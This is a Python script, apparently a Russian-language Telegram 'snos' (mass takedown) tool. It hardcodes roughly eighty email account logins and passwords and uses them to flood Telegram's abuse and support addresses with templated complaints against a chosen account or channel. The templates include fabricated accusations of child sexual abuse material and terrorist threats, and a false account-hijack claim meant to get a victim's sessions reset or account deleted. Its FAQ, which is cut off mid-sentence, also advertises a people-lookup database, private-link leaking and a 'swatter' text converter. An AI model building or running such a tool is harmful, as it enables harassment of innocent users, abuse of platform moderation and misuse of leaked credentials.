import os
import asyncio
import logging
import sys
import datetime
import time
import sqlite3
from pystyle import Colors, Colorate, Box, Write
from aiogram import Bot, Dispatcher, html, types
from aiogram.methods import SetMessageReaction
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.filters.command import Command
from aiogram.types import Message, ContentType, ReactionTypeEmoji
from aiogram import F
from aiogram.client.session.aiohttp import AiohttpSession
import random
import string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
#from aiogram.contrib.fsm_storage.memory import MemoryStorage

# Отправители и их пароли
senders = {'lyimbshsup@rambler.ru': '6463734rnAygg',
           'jdqukazixk@rambler.ru': '0225223ACFeq0',
           'baljufgcnc@rambler.ru': '4738678YMyCvO',
           'ruslanorlovimx4134@rambler.ru': 'Andersonnancy945',
           'vladislavkulikovxcr1902@rambler.ru': 'Allenkimberly021',
           'romasidorovdbj3700@rambler.ru': 'Clarkmargaret444',
           'lehabogdanovhdw1954@rambler.ru': 'Evanssandra913',
           'mihailtitovopr6182@rambler.ru': 'Younghelen407',
           'koljafedotovmqj2347@rambler.ru': 'Gonzalezsarah321',
           'genasemenovhvu9785@rambler.ru': 'Taylorlaura482',
           'vovafedorovmvu7067@rambler.ru': 'Collinsbetty976',
           'grishakulikovyyk8848@rambler.ru': 'Wilsonlaura931',
           'olegnikitinxwo3553@rambler.ru': 'Wrightkaren568',
           'gennadijkalininizb3132@rambler.ru': 'Turnerdorothy038',
           'bogdankarpovxad9304@rambler.ru': 'Carterlinda019',
           'koljakuznecovzfq8892@rambler.ru': 'Walkerhelen225',
           'vladdmitrievtpv8734@rambler.ru': 'Brownmary434',
           'arturkovalevdln7432@rambler.ru': 'Lewisnancy365',
           'konstantinbelovabq7348@rambler.ru': 'Allenmary923',
           'sashavorobevbml8362@rambler.ru': 'Hilllaura818',
           'ruslankozlovhji7240@rambler.ru': 'Hallnancy735',
           'olegzajcevepy8163@rambler.ru': 'Nelsonsharon117',
           'grigorijfominlxp0053@rambler.ru': 'Wrightpatricia686',
           'vitalijmaslovusv3737@rambler.ru': 'Garciabetty827',
           'olegbelovblx5518@rambler.ru': 'Phillipssharon437',
           'olegmaslovrde8926@rambler.ru': 'Mitchellbetty324',
           'vitalijdavydovtal6583@rambler.ru': 'Rodriguezmichelle351',
           'dmitrijmironovlaf9788@rambler.ru': 'Whitedeborah816',
           'vanjakulikovdpf6394@rambler.ru': 'Allencarol017',
           'andrejmaksimovwjw5202@rambler.ru': 'Cartersusan436',
           'zhenjaafanasevomj8876@rambler.ru': 'Harrislinda730',
           'sanjatimofeevxur1820@rambler.ru': 'Martinmichelle433',
           'grishabogdanovhqj9645@rambler.ru': 'Turnermargaret062',
           'viktorpavlovzlh2404@rambler.ru': 'Hilllaura917',
           'mihailkuznecovbuh2424@rambler.ru': 'Millerkaren783',
           'bogdanmironovkgf3690@rambler.ru': 'Greenjennifer095',
           'tolikkulikovnfv3662@rambler.ru': 'Perezelizabeth881',
           'sanjaabramovotb8410@rambler.ru': 'Hillpatricia526',
           'pashabykovzhy8581@rambler.ru': 'Scottdonna750',
           'jurijbogdanovwuc0744@rambler.ru': 'Harrisnancy027',
           'antongusevaws0670@rambler.ru': 'Collinsruth779',
           'maksimlebedevsxm5444@rambler.ru': 'Evanskaren499',
           'vladimirchernyshevfnt3789@rambler.ru': 'Halldonna541',
           'petjagusevrzl9637@rambler.ru': 'Taylorpatricia485',
           'vitaliklebedevhla3289@rambler.ru': 'Lewismichelle721',
           'aleksandrwerbakovsbg8385@rambler.ru': 'Gonzalezdeborah554',
           'pavelgrigorevjtz4407@rambler.ru': 'Campbellbetty034',
           'maksdenisovskv0461@rambler.ru': 'Smithmaria151',
           'gennadijtihonovqzc3691@rambler.ru': 'Clarksharon602',
           'ruslandmitrievvgr1236@rambler.ru': 'Kingdeborah697',
           'genamaslovfys4433@rambler.ru': 'Wrightsharon746',
           'borjamironovfrc3345@rambler.ru': 'Harrissusan337',
           'antonchernovown4062@rambler.ru': 'Thomaskimberly712',
           'vladimirgrigoreveqq9112@rambler.ru': 'Parkermichelle304',
           'sashawerbakoviet2953@rambler.ru': 'Clarksharon806',
           'mishaantonovcwv6881@rambler.ru': 'Kingmargaret388',
           'mihailmelnikovoyp1458@rambler.ru': 'Wilsonlisa429',
           'kostjakiselevhjw4194@rambler.ru': 'Evanshelen904',
           'kostjastepanovbes5317@rambler.ru': 'Carterlaura187',
           'toljadanilovcvh2967@rambler.ru': 'Martinezbarbara968',
           'leshakozlovspt3407@rambler.ru': 'Hernandezbetty901',
           'vanjakozlovbvy7090@rambler.ru': 'Jonescarol966',
           'leshafilippovfha9160@rambler.ru': 'Davislinda702',
           'olegjakovlevmkp6120@rambler.ru': 'Perezjennifer226',
           'igorisaevfen3865@rambler.ru': 'Allenpatricia615',
           'pashakonovalovgmf3693@rambler.ru': 'Garciamichelle737',
           'vladimirandreevqol3763@rambler.ru': 'Robinsonkimberly357',
           'jurijprohorovgnq3561@rambler.ru': 'Kinglaura374',
           'vladislavtarasovpqk4498@rambler.ru': 'Garciacarol344',
           'antonvorobevtxz5033@rambler.ru': 'Lopezlinda159',
           'romaandreevjvo1698@rambler.ru': 'Youngnancy376',
           'vladislavbeljaevvfa7045@rambler.ru': 'Robertsjennifer080',
           'vitaliknikolaevzoh1565@rambler.ru': 'Collinsdonna967',
           'koljamironovydt4703@rambler.ru': 'Wrightmichelle859',
           'gennadijsemenovmki9018@rambler.ru': 'Perezsusan734',
           'pashakarpovafr2420@rambler.ru': 'Wrightsarah462',
           'artemkomarovqqt3719@rambler.ru': 'Martinlinda992',
           'konstantinchernyshevneh8321@rambler.ru': 'Smithdonna021',
           'grigorijsidorovrpl5056@rambler.ru': 'Harrispatricia221',
           'petrsergeevmse2216@rambler.ru': 'Bakerjennifer796'}



receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'support@telegram.org']

func = 0
off = 0
while True:
    def menu():
        global func
        print(Colorate.Horizontal(Colors.red_to_purple, """
        
         █     █░ ▒█████   ██▀███   ▀██ ▄█▀▄▄▄█████▓ █████  ███▄ ▄███▓ ▀██ ▄█▀ ▄▄▄     v0.25
        ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒  ██▄█▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒  ██▄█▒ ▒████▄   
        ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒ ▓███▄░ ▒ ▓██░ ▒░▒███   ▓██    ▓██░ ▓███▄░ ▒██  ▀█▄ 
        ░█░ █ ░█ ▒██   ██░▒██▀▀█▄   ▓██ █▄ ░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██  ▓██ █▄ ░██▄▄▄▄██
        ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒ ▒██▒ █▄  ▒██▒ ░ ░▒████▒▒██▒   ░██▒ ▒██▒ █▄ ▓█   ▓██
        ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒ ▒▒ ▓▒  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒ ▒▒ ▓▒ ▒▒   ▓▒█
          ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░▒ ▒░    ░     ░ ░  ░░  ░      ░ ░ ░▒ ▒░  ░   ▒▒ 
          ░   ░  ░ ░ ░ ▒     ░   ░  ░ ░░ ░   ░ ░       ░   ░      ░    ░ ░░ ░   ░   ▒  
            ░        ░ ░     ░      ░  ░               ░  ░       ░    ░  ░         ░  
                                
        ________________________________________________________________________________

                                powered by @BAGROVYI_3AKAT""", 1))
        
        print(""" 
        
         -> [1] - offline mode                       -> [4] - start game :)
         X  [2] - soon...                  
         X  [3] - soon...                            -> [?] - FAQ
        """)
        func = Write.Input(""">>> """, Colors.red_to_purple, interval=0.0025)

    menu()

    def offline_mode_menu():
        global off
        print(Colorate.Horizontal(Colors.red_to_purple, """
        
         █     █░ ▒█████   ██▀███   ▀██ ▄█▀▄▄▄█████▓ █████  ███▄ ▄███▓ ▀██ ▄█▀ ▄▄▄     v0.25    OFFLINE MODE
        ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒  ██▄█▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒  ██▄█▒ ▒████▄   
        ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒ ▓███▄░ ▒ ▓██░ ▒░▒███   ▓██    ▓██░ ▓███▄░ ▒██  ▀█▄ 
        ░█░ █ ░█ ▒██   ██░▒██▀▀█▄   ▓██ █▄ ░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██  ▓██ █▄ ░██▄▄▄▄██
        ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒ ▒██▒ █▄  ▒██▒ ░ ░▒████▒▒██▒   ░██▒ ▒██▒ █▄ ▓█   ▓██
        ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒ ▒▒ ▓▒  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒ ▒▒ ▓▒ ▒▒   ▓▒█
          ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░▒ ▒░    ░     ░ ░  ░░  ░      ░ ░ ░▒ ▒░  ░   ▒▒ 
          ░   ░  ░ ░ ░ ▒     ░   ░  ░ ░░ ░   ░ ░       ░   ░      ░    ░ ░░ ░   ░   ▒  
            ░        ░ ░     ░      ░  ░               ░  ░       ░    ░  ░         ░  
                                
        ________________________________________________________________________________

                                powered by @BAGROVYI_3AKAT""", 1))

        print(""" 
        
         -> [1] - Снос тг акка                      X  [4] - soon...
         -> [2] - Снос канала                  
         X  [3] - Поиск по бд                       -> [?] - FAQ
        """)

        off = Write.Input(""">>> """, Colors.red_to_purple, interval=0.0025)

    def offline_mode_menu_1():
        global off1
        print(Colorate.Horizontal(Colors.red_to_purple, """
        
         █     █░ ▒█████   ██▀███   ▀██ ▄█▀▄▄▄█████▓ █████  ███▄ ▄███▓ ▀██ ▄█▀ ▄▄▄     v0.25    OFFLINE MODE
        ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒  ██▄█▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒  ██▄█▒ ▒████▄   
        ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒ ▓███▄░ ▒ ▓██░ ▒░▒███   ▓██    ▓██░ ▓███▄░ ▒██  ▀█▄ 
        ░█░ █ ░█ ▒██   ██░▒██▀▀█▄   ▓██ █▄ ░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██  ▓██ █▄ ░██▄▄▄▄██
        ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒ ▒██▒ █▄  ▒██▒ ░ ░▒████▒▒██▒   ░██▒ ▒██▒ █▄ ▓█   ▓██
        ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒ ▒▒ ▓▒  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒ ▒▒ ▓▒ ▒▒   ▓▒█
          ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░▒ ▒░    ░     ░ ░  ░░  ░      ░ ░ ░▒ ▒░  ░   ▒▒ 
          ░   ░  ░ ░ ░ ▒     ░   ░  ░ ░░ ░   ░ ░       ░   ░      ░    ░ ░░ ░   ░   ▒  
            ░        ░ ░     ░      ░  ░               ░  ░       ░    ░  ░         ░  
                                
        ________________________________________________________________________________

                                powered by @BAGROVYI_3AKAT""", 1))

        print(""" 
        
         -> [1.1] - Обычный снос                      -> [1.2] - Снос сессии
        """)

        off1 = Write.Input(""">>> """, Colors.red_to_purple, interval=0.0025)

    def offline_mode_menu_2():
        global complaint_type
        print(Colorate.Horizontal(Colors.red_to_purple, """
        
         █     █░ ▒█████   ██▀███   ▀██ ▄█▀▄▄▄█████▓ █████  ███▄ ▄███▓ ▀██ ▄█▀ ▄▄▄     v0.25    OFFLINE MODE
        ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒  ██▄█▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒  ██▄█▒ ▒████▄   
        ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒ ▓███▄░ ▒ ▓██░ ▒░▒███   ▓██    ▓██░ ▓███▄░ ▒██  ▀█▄ 
        ░█░ █ ░█ ▒██   ██░▒██▀▀█▄   ▓██ █▄ ░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██  ▓██ █▄ ░██▄▄▄▄██
        ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒ ▒██▒ █▄  ▒██▒ ░ ░▒████▒▒██▒   ░██▒ ▒██▒ █▄ ▓█   ▓██
        ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒ ▒▒ ▓▒  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒ ▒▒ ▓▒ ▒▒   ▓▒█
          ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░▒ ▒░    ░     ░ ░  ░░  ░      ░ ░ ░▒ ▒░  ░   ▒▒ 
          ░   ░  ░ ░ ░ ▒     ░   ░  ░ ░░ ░   ░ ░       ░   ░      ░    ░ ░░ ░   ░   ▒  
            ░        ░ ░     ░      ░  ░               ░  ░       ░    ░  ░         ░  
                                
        ________________________________________________________________________________

                                powered by @BAGROVYI_3AKAT""", 1))

        print(""" 
        
         -> [8] - Личные данные                      -> [12] - Мошенничество
         -> [9] - Для прайсов                        -> [13] - Продажа вирт номеров
         -> [10] - Для геймов                        -> [14] - Расчлененка
         -> [11] - Детское питание                   -> [15] - Живодерство
        """)

        complaint_type = Write.Input(""">>> """, Colors.red_to_purple, interval=0.0025)

    def banner():
        print(Colorate.Horizontal(Colors.red_to_purple, """
        
         █     █░ ▒█████   ██▀███   ▀██ ▄█▀▄▄▄█████▓ █████  ███▄ ▄███▓ ▀██ ▄█▀ ▄▄▄     v0.25
        ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒  ██▄█▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒  ██▄█▒ ▒████▄   
        ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒ ▓███▄░ ▒ ▓██░ ▒░▒███   ▓██    ▓██░ ▓███▄░ ▒██  ▀█▄ 
        ░█░ █ ░█ ▒██   ██░▒██▀▀█▄   ▓██ █▄ ░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██  ▓██ █▄ ░██▄▄▄▄██
        ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒ ▒██▒ █▄  ▒██▒ ░ ░▒████▒▒██▒   ░██▒ ▒██▒ █▄ ▓█   ▓██
        ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒ ▒▒ ▓▒  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒ ▒▒ ▓▒ ▒▒   ▓▒█
          ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░▒ ▒░    ░     ░ ░  ░░  ░      ░ ░ ░▒ ▒░  ░   ▒▒ 
          ░   ░  ░ ░ ░ ▒     ░   ░  ░ ░░ ░   ░ ░       ░   ░      ░    ░ ░░ ░   ░   ▒  
            ░        ░ ░     ░      ░  ░               ░  ░       ░    ░  ░         ░  
                                
        ________________________________________________________________________________

                                powered by @BAGROVYI_3AKAT""", 1))

    def offline_banner():
        print(Colorate.Horizontal(Colors.red_to_purple, """
        
         █     █░ ▒█████   ██▀███   ▀██ ▄█▀▄▄▄█████▓ █████  ███▄ ▄███▓ ▀██ ▄█▀ ▄▄▄     v0.25    OFFLINE MODE
        ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒  ██▄█▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒  ██▄█▒ ▒████▄   
        ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒ ▓███▄░ ▒ ▓██░ ▒░▒███   ▓██    ▓██░ ▓███▄░ ▒██  ▀█▄ 
        ░█░ █ ░█ ▒██   ██░▒██▀▀█▄   ▓██ █▄ ░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██  ▓██ █▄ ░██▄▄▄▄██
        ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒ ▒██▒ █▄  ▒██▒ ░ ░▒████▒▒██▒   ░██▒ ▒██▒ █▄ ▓█   ▓██
        ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒ ▒▒ ▓▒  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒ ▒▒ ▓▒ ▒▒   ▓▒█
          ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░▒ ▒░    ░     ░ ░  ░░  ░      ░ ░ ░▒ ▒░  ░   ▒▒ 
          ░   ░  ░ ░ ░ ▒     ░   ░  ░ ░░ ░   ░ ░       ░   ░      ░    ░ ░░ ░   ░   ▒  
            ░        ░ ░     ░      ░  ░               ░  ░       ░    ░  ░         ░  
                                
        ________________________________________________________________________________

                                powered by @BAGROVYI_3AKAT""", 1))

    
    def token():
        global TOKEN
        TOKEN = Write.Input("""Enter token -> """, Colors.red_to_purple, interval=0.0025)
    
    def admin():
        global idchnik
        idchnik = int(Write.Input("""Enter your Telegram ID -> """, Colors.red_to_purple, interval=0.0025))

    def in_work():
        print(Colorate.Horizontal(Colors.red_to_purple, f"""
        
         █     █░ ▒█████   ██▀███   ▀██ ▄█▀▄▄▄█████▓ █████  ███▄ ▄███▓ ▀██ ▄█▀ ▄▄▄     v0.25    ПОВЕЛИТЕЛЬ: {idchnik}
        ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒  ██▄█▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒  ██▄█▒ ▒████▄   
        ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒ ▓███▄░ ▒ ▓██░ ▒░▒███   ▓██    ▓██░ ▓███▄░ ▒██  ▀█▄ 
        ░█░ █ ░█ ▒██   ██░▒██▀▀█▄   ▓██ █▄ ░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██  ▓██ █▄ ░██▄▄▄▄██
        ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒ ▒██▒ █▄  ▒██▒ ░ ░▒████▒▒██▒   ░██▒ ▒██▒ █▄ ▓█   ▓██
        ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒ ▒▒ ▓▒  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒ ▒▒ ▓▒ ▒▒   ▓▒█
          ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░▒ ▒░    ░     ░ ░  ░░  ░      ░ ░ ░▒ ▒░  ░   ▒▒ 
          ░   ░  ░ ░ ░ ▒     ░   ░  ░ ░░ ░   ░ ░       ░   ░      ░    ░ ░░ ░   ░   ▒  
            ░        ░ ░     ░      ░  ░               ░  ░       ░    ░  ░         ░  
                                
        ________________________________________________________________________________

                                powered by @CTRAX_PEDOFILOB""", 1))
    
    def offline_mode(senders, receivers):
        os.system('cls')
        offline_mode_menu()
        total_emails = len(senders) * len(receivers)
        sent_emails = 0
    
        while sent_emails < total_emails:
    
            if off == "1":
                #print("\nВыберите тип жалобы:")
                #print("\n[ 1.1 ] Обычный snos")
                #print("[ 1.2 ] snos сеsсий")
                os.system('cls')
                offline_mode_menu_1()
                
                if off1 == "1.1":
                    os.system('cls')
                    offline_banner()
                    print(Colorate.Horizontal(Colors.green_to_white, "\nВведите причину, юзернейм, telegram ID, затем ссылки на канал/чат и на нарушение", 1))
                    reason = Write.Input("""Причина -> """, Colors.red_to_purple, interval=0.0025)
                    username = Write.Input("""Юзернейм -> """, Colors.red_to_purple, interval=0.0025)
                    telegram_ID = Write.Input("""Телеграм айди -> """, Colors.red_to_purple, interval=0.0025)
                    chat_link = Write.Input("""Ссылка на чат -> """, Colors.red_to_purple, interval=0.0025)
                    violation_chat_link = Write.Input("""Ссылка на нарушение -> """, Colors.red_to_purple, interval=0.0025)

    
                    complaint_texts = {
                        "1.1": f"Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_ID}. Ссылка на чат с нарушениями - {chat_link}, ссылки на нарушения - {violation_chat_link}. Спасибо за помощь."
                    }
    
                    for sender_email, sender_password in senders.items():
                        for receiver_email in receivers:
                            complaint_text = complaint_texts[off1]
                            complaint_body = complaint_text.format(reason=reason.strip(), username=username.strip(), telegram_ID=telegram_ID.strip(), chat_link=chat_link.strip(), violation_chat_link=violation_chat_link.strip())
                            send_email(receiver_email, sender_email, sender_password, "Жалоба на Telegram аккаунт", complaint_body)
                            print(Colorate.Horizontal(Colors.green_to_white, "\n\n[ Удачно ] Жалоба отправлена! | {receiver_email} от {sender_email}!", 1))
                            sent_emails += 1
    
                elif off1 == "1.2":
                    os.system('cls')
                    offline_banner()
                    print(Colorate.Horizontal(Colors.green_to_white, "\nВведите юзернейм и Telegram ID", 1)) 
                    account_username = Write.Input("\nUsername -> ", Colors.red_to_purple, interval=0.0025)
                    Telegram_account_ID = Write.Input("Telegram ID -> ", Colors.red_to_purple, interval=0.0025)
                    os.system('cls')
                    offline_banner()
    
                    complaint_texts = {
                        "1.2": f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм — {account_username}, а мой айди, если злоумышленник поменял юзернейм — {Telegram_account_ID}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных."
                    }
    
                    for sender_email, sender_password in senders.items():
                        for receiver_email in receivers:
                            complaint_text = complaint_texts[off1]
                            complaint_body = complaint_text.format(account_username=account_username.strip(), Telegram_account_ID=Telegram_account_ID.strip())
                            send_email(receiver_email, sender_email, sender_password, "Я утерял свой телеграм-аккаунт", complaint_body)
                            print(Colorate.Horizontal(Colors.green_to_white, f"\n\n[ Удачно ] Жалоба отправлена! |{receiver_email} от {sender_email}!", 1))
    
            elif off == "2":
                os.system('cls')
                offline_mode_menu_2()
                os.system('cls')
                offline_banner()
    
                complaint_types = {
                    "8": ["Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link} . Ссылка на нарушение - {violation_link} . Просьба удалить данный канал с вашей площадки", "Hello, Telegram support team! I have found a channel on your social network where personal data of innocent people is being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform"],
            "9": ["Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{violation_link} Просьба заблокировать данный канал.", "Hello, dear Telegram moderator,I would like to file a complaint regarding a channel on your platform that is selling doxxing and swatting services. Here are the details: Telegram channel link: {channel_link} Violation link: {violation_link} Please block this channel."],
            "10": ["Hello dear Telegram support! Please block the {channel_link} channel The channel threatens to shoot children in schools and commit terrorist attacks, you can see it here {violation_link} Thank you in advance", "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо."],
            "11": ["Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}  . Ссылка на нарушение - {violation_link} . Просьба удалить данный канал с вашей площадки", "Hello, Telegram support! In your social network, I found a channel posting pornography videos with children. Channel link - {channel_link} violation link - {violation_link} , please block this channel"],
            "12": ["Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}  . Ссылка на нарушение - {violation_link} . Просьба удалить данный канал с вашей площадки", "Hello, Telegram support! In your social network, I found a channel where posts aimed at deception and fraud are being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform."],
            "13": ["Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link} . Спасибо что очищаете свою площадку от подобных каналов!", "Hello, Telegram support. I would like to report a Telegram channel selling virtual phone numbers, which as far as I know, is prohibited by your platform's rules. Here are the details:Channel link: {channel_link} Violation link: {violation_link} Thank you for cleansing your platform from such channels!"],
            "14": ["Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link} , ссылка на нарушение - {violation_link} . Просьба удалить данный канал, спасибо за внимание.", "Good day, esteemed support team. I came across a channel on your platform that disseminates shocking content involving human fatalities. Here is the link to the channel - {channel_link}, along withthe violation link - {violation_link}. Kindly remove this channel. Thank you for your attention."],
            "15": ["Здравствуйте, уважаемая поддержка. На вашей платформе я нашел канал который выкладывает жестокое обращение с животными. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо за то что делаете телеграм чище.", "Hello, dear support. I found a channel postingcruelty to animals. Channel link - {channel_link} , violation links - {violation_link} Thank you"],
    
                }
    
                if complaint_type not in complaint_types:
                   print(Colorate.Horizontal(Colors.red_to_white, "\n\n[ Error ] Некорректный выбор.", 1))
                else:
                    os.system('cls')
                    offline_banner()
                    complaint_texts = complaint_types[complaint_type]
                    channel_link = Write.Input("\nСсылка на канал: ", Colors.red_to_purple, interval=0.0025)
                    violation_link = Write.Input("Ссылка на нарушение: ", Colors.red_to_purple, interval=0.0025)
                    os.system('cls')
                    offline_banner()
    
                    for sender_email, sender_password in senders.items():
                        for receiver_email in random.sample(receivers, min(2, len(receivers))):
                            complaint_body = complaint_texts[0].format(channel_link=channel_link.strip(), violation_link=violation_link.strip())
                            send_email(receiver_email, sender_email, sender_password, "Жалоба на канал в Telegram", complaint_body)
                            print(Colorate.Horizontal(Colors.green_to_white, f"\n\n[ Удачно ] Жалоба отправлена! |{receiver_email}!", 1))
                            sent_emails += 1
                    # Отправка писем на английском
                    if len(complaint_texts) > 1:
                        for sender_email, sender_password in senders.items():
                            for receiver_email in random.sample(receivers, min(2, len(receivers))):
                                complaint_body = complaint_texts[1].format(channel_link=channel_link.strip(), violation_link=violation_link.strip())
                                send_email(receiver_email, sender_email, sender_password, "Complaint about a channel in Telegram", complaint_body)
                                print(Colorate.Horizontal(Colors.green_to_white, f"Sent to {receiver_email}!", 1))
                                sent_emails += 1
                    print(Colorate.Horizontal(Colors.green_to_white, "[ Удачно ] Жалоба отправлена! |", 1))
            elif off == '?':
                text = """                  ________________________________________________________________________________
                                              Краткое руководство
                  ________________________________________________________________________________
                                                    v0.25
        
                  QQ, это мой новый проект, сначала хотел сделать что-то одно, но получилась солянка ебаная.
                  WARNING: Данный софт управляет ботом в тг по токену бота, но не создает его(!)
                           Перед использованием надо создать бота самому (@BotFather)
                  *А схуяли софт просит мой айди?:
                          Софт запрашивает айди тг, тем самым ТЫ становишься его господином и повелителем
                                                  (не обязательно черным)
                  Так вот, в этом боте дохуища не взаимосвязанных функций, запоминай епт:
  
                      1 - Типичный парсер сообщений, для тех кто не шарит, это как анонка на максималках 
                          1.2 - /w (id чата) Команда для обозначения чата, куда будете писать через бота.
                                Это короче ну..  добавили бота в группу или ему в лс пишет какой-то
                                додик? Так вот там в сообщении есть  - id, его и копируешь
                          1.3 - /r (id сообщения) (сам текст) Команда для реплаев, выше уже описано,
                                как и где брать id сообщения, а сам текст я думаю сами придумаете
                          1.4 - /c (сам текст) Команда для отправки сообщений по id чата, тут все просто
  
                      2 - Когда- то понадобилось, решил сюда впихнуть - конвертер в сватерский текст
                          2.1 - /swat (текст для конверта) ну база же, че не понятно
  
                      3 - Есть возможность ставить реакции на сообщения через команду:
                          3.1 - /em (id сообщения) (сама реакция) Ставит реакцию
                          3.2 - /emd (id сообщения) Убирает реакцию
                          список доступных реакций можно узнать в самом боте, методом тыка)))00
  
                      4 - Чтобы не быть лохом и не попадать в неловкие ситуации
                          4.1 - /del (id сообщения) Удаляет отправленное тобой соо(как ты узнаешь id соо 
                          меня не ебет, используй мозг сука)
                          4.2 - /ed (id cообщения) (исправленный текст) Кста есть фича, редактированные
                                соо от бота не помечаются как отредаченные
  
                      5 - Изюминка, нет, целое поле винограда нахуй - функция поиска по бд. Бля я
                          не ебу как и под чем я его писал, но теперь данную функцию можно только удалить
                          нахуй и написать заново если кому делать нехуй, бд и ее формат внутри корневой
                          папки
                          5.1 - /inf (ник тг/юз/id) Работает как часики))))0)
  
                      6 - База всех баз - отправка и принятие медиа, гс, аудио, кружков, стиков, гифок.
                          просто отправляешь что-то из вышеперечисленного и оно само отправляется к адресату
  
                      7 - Возможность заебать челика
                          7.1 - /pin (id сообщения) Тупа закреп, хули
                          7.2 - /unpin (id сообщения) Тупа снять закреп
  
                      8 - Если каким-то чудом бот находится в админах чата или канала, то он может слить 
                          приват ссылку, работает в купе с командой 1.2 
                          8.1 - /link Без аргументов
  
                      9 - Для обиженок, работает в купе с командой 1.2
                          9.1 - /liv Ливнуть нах
                     *10 - Добавлен глобальный оффлайн мод, в нем есть функции сноса акков и каналов в 
